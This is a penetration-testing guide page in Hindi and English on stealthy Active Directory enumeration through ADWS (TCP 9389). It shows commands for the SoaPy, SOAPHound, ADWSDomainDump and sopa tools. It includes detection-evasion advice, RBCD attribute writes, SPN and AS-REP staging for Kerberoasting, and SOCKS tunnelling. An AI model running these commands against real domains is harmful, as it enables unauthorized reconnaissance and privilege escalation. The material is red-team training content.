# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS क्या है?

Active Directory Web Services (ADWS) **Windows Server 2008 R2 से प्रत्येक Domain Controller पर डिफ़ॉल्ट रूप से सक्षम होता है** और TCP **9389** पर सुनता है। नाम के बावजूद, **कोई HTTP शामिल नहीं है**। यह सेवा LDAP-style डेटा को मालिकाना .NET framing प्रोटोकॉल के स्टैक के माध्यम से एक्सपोज़ करती है:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

चूँकि ट्रैफ़िक इन बाइनरी SOAP फ्रेम्स में एनकैप्सुलेट होता है और एक कम-सामान्य पोर्ट पर जाता है, इसलिए **ADWS के जरिए enumeration पारंपरिक LDAP/389 & 636 ट्रैफ़िक की तुलना में काफी कम संभावना है कि उसे इंस्पेक्ट, फ़िल्टर या सिग्नेचर किया जाए**। ऑपरेटरों के लिए इसका मतलब है:

* Stealthier recon – Blue teams अक्सर LDAP क्वेरीज पर ध्यान केंद्रित करते हैं।
* **non-Windows hosts (Linux, macOS)** से कलेक्ट करने की स्वतंत्रता, बस 9389/TCP को SOCKS proxy के जरिए टनल करें।
* वही डेटा जो आप LDAP से प्राप्त करेंगे (users, groups, ACLs, schema, आदि) और साथ ही **writes** करने की क्षमता (उदाहरण के लिए `msDs-AllowedToActOnBehalfOfOtherIdentity` के माध्यम से **RBCD**).

ADWS इंटरैक्शंस WS-Enumeration के ऊपर लागू होते हैं: हर क्वेरी एक `Enumerate` मैसेज के साथ शुरू होती है जो LDAP फ़िल्टर/एट्रिब्यूट्स को परिभाषित करती है और एक `EnumerationContext` GUID लौटाती है, उसके बाद एक या अधिक `Pull` मैसेज आते हैं जो सर्वर-निर्धारित result window तक स्ट्रीम करते हैं। Contexts लगभग 30 मिनट के बाद expire हो जाते हैं, इसलिए टूलिंग को या तो परिणामों को पेज करना होगा या state खोने से बचने के लिए फ़िल्टर विभाजित करने होंगे (प्रति CN प्रीफ़िक्स क्वेरीज). जब security descriptors माँगे जाते हैं, तो SACLs को छोड़ने के लिए `LDAP_SERVER_SD_FLAGS_OID` कंट्रोल निर्दिष्ट करें, अन्यथा ADWS अपने SOAP उत्तर से `nTSecurityDescriptor` एट्रिब्यूट को बस ड्रॉप कर देता है।

> नोट: ADWS कई RSAT GUI/PowerShell टूल्स द्वारा भी उपयोग होता है, इसलिए ट्रैफ़िक वैध एडमिन गतिविधि के साथ मिश्रित दिख सकता है।

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) ADWS प्रोटोकॉल स्टैक का एक **pure Python में पूरा री-इम्प्लीमेंटेशन** है। यह NBFX/NBFSE/NNS/NMF फ्रेम्स को बाइट-फॉर-बाइट क्राफ्ट करता है, जिससे Unix-like सिस्टम्स से कलेक्शन संभव होता है बिना .NET runtime को छुए।

### Key Features

* Supports **proxying through SOCKS** (C2 implants से उपयोगी)।
* Fine-grained search filters जो LDAP `-q '(objectClass=user)'` के समान हैं।
* वैकल्पिक **write** ऑपरेशंस (`--set` / `--delete`)।
* **BOFHound output mode** सीधे BloodHound में ingest करने के लिए।
* जब human readability चाहिए हो तो `--parse` फ्लैग timestamps / `userAccountControl` को prettify करता है।

### Targeted collection flags & write operations

SoaPy में curated स्विचेज़ शामिल हैं जो ADWS पर सबसे सामान्य LDAP hunting टास्क्स को replicate करते हैं: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, साथ ही कस्टम पुल्स के लिए raw `--query` / `--filter` नॉब्स। इन्हें write primitives के साथ पेयर करें जैसे `--rbcd <source>` (सेट करता है `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (targeted Kerberoasting के लिए SPN staging) और `--asrep` (`userAccountControl` में `DONT_REQ_PREAUTH` को फ्लिप करना)।

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
इसी host/credentials का उपयोग करके तुरंत findings को weaponise करें: RBCD-capable objects को `--rbcds` से dump करें, फिर Resource-Based Constrained Delegation chain को stage करने के लिए `--rbcd 'WEBSRV01$' --account 'FILE01$'` लागू करें (पूर्ण abuse path के लिए देखें [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### इंस्टॉलेशन (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* एक `ldapdomaindump` का Fork है जो LDAP queries को ADWS calls पर (TCP/9389) स्वैप करता है ताकि LDAP-signature hits कम हों।
* प्रारम्भिक reachability check 9389 के लिए करता है जब तक `--force` पास न किया गया हो (यदि port scans noisy/filtered हैं तो probe को स्किप करता है)।
* Microsoft Defender for Endpoint और CrowdStrike Falcon के खिलाफ टेस्ट किया गया, README में successful bypass दर्ज है।

### इंस्टॉलेशन
```bash
pipx install .
```
### उपयोग
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
आम आउटपुट 9389 की पहुँच-जाँच, ADWS bind, और dump के शुरू/समाप्ति को लॉग करता है:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - ADWS के लिए एक व्यावहारिक क्लाइंट (Golang में)

ठीक वैसे ही जैसे soapy, [sopa](https://github.com/Macmod/sopa) ADWS प्रोटोकॉल स्टैक (MS-NNS + MC-NMF + SOAP) को Golang में इम्प्लीमेंट करता है, और ADWS कॉल जारी करने के लिए कमांड-लाइन फ्लैग एक्सपोज़ करता है, जैसे:

* **ऑब्जेक्ट खोज और पुनर्प्राप्ति** - `query` / `get`
* **ऑब्जेक्ट लाइफसायकल** - `create [user|computer|group|ou|container|custom]` और `delete`
* **एट्रिब्यूट संपादन** - `attr [add|replace|delete]`
* **खाता प्रबंधन** - `set-password` / `change-password`
* और अन्य जैसे `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, आदि।

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) एक .NET कलेक्टर है जो सभी LDAP इंटरैक्शन को ADWS के भीतर रखता है और BloodHound v4-compatible JSON उत्पन्न करता है। यह `objectSid`, `objectGUID`, `distinguishedName` और `objectClass` का एक पूरा कैश एक बार (`--buildcache`) बनाता है, फिर उच्च-वॉल्यूम `--bhdump`, `--certdump` (ADCS), या `--dnsdump` (AD-integrated DNS) पास के लिए इसे पुन: उपयोग करता है ताकि मात्र ~35 महत्वपूर्ण विशेषताएँ ही कभी DC से बाहर जाएँ। AutoSplit (`--autosplit --threshold <N>`) स्वचालित रूप से क्वेरीज़ को CN प्रीफ़िक्स के आधार पर शार्ड करता है ताकि बड़े forests में 30-मिनट EnumerationContext timeout के भीतर रहा जा सके।

डोमेन-जुड़ी ऑपरेटर VM पर सामान्य वर्कफ़्लो:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exported JSON को सीधे SharpHound/BloodHound workflows में डालें—downstream graphing ideas के लिए [BloodHound methodology](bloodhound.md) देखें। AutoSplit, SOAPHound को multi-million object forests पर टिकाऊ बनाता है और query count को ADExplorer-style snapshots की तुलना में कम रखता है।

## Stealth AD संग्रह कार्यप्रवाह

निम्न कार्यप्रवाह दिखाता है कि ADWS पर कैसे **domain & ADCS objects** को enumerate किया जाए, उन्हें BloodHound JSON में convert किया जाए और certificate-based attack paths के लिए hunt किया जाए — यह सब Linux से:

1. **Tunnel 9389/TCP** को target network से अपनी मशीन तक रखें (उदा. via Chisel, Meterpreter, SSH dynamic port-forward, आदि के माध्यम से)। Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` या SoaPy’s `--proxyHost/--proxyPort` का उपयोग करें।

2. **रूट डोमेन ऑब्जेक्ट एकत्र करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC से ADCS-संबंधित ऑब्जेक्ट्स एकत्र करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound में रूपांतरित करें:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP अपलोड करें** BloodHound GUI में और cypher queries चलाएँ जैसे `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` ताकि certificate escalation paths (ESC1, ESC8, आदि) प्रकट हो सकें।

### लिखना `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
इसे `s4u2proxy`/`Rubeus /getticket` के साथ मिलाएँ ताकि एक पूरी **Resource-Based Constrained Delegation** श्रृंखला बन सके (देखें [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## उपकरण सारांश

| उद्देश्य | टूल | नोट्स |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, पढ़ना/लिखना |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | इसे उसी SOCKS के माध्यम से प्रॉक्सी किया जा सकता है |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | ज्ञात ADWS endpoints के साथ इंटरफ़ेस करने के लिए एक सामान्य क्लाइंट — enumeration, object creation, attribute modifications, और password changes की अनुमति देता है |

## संदर्भ

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
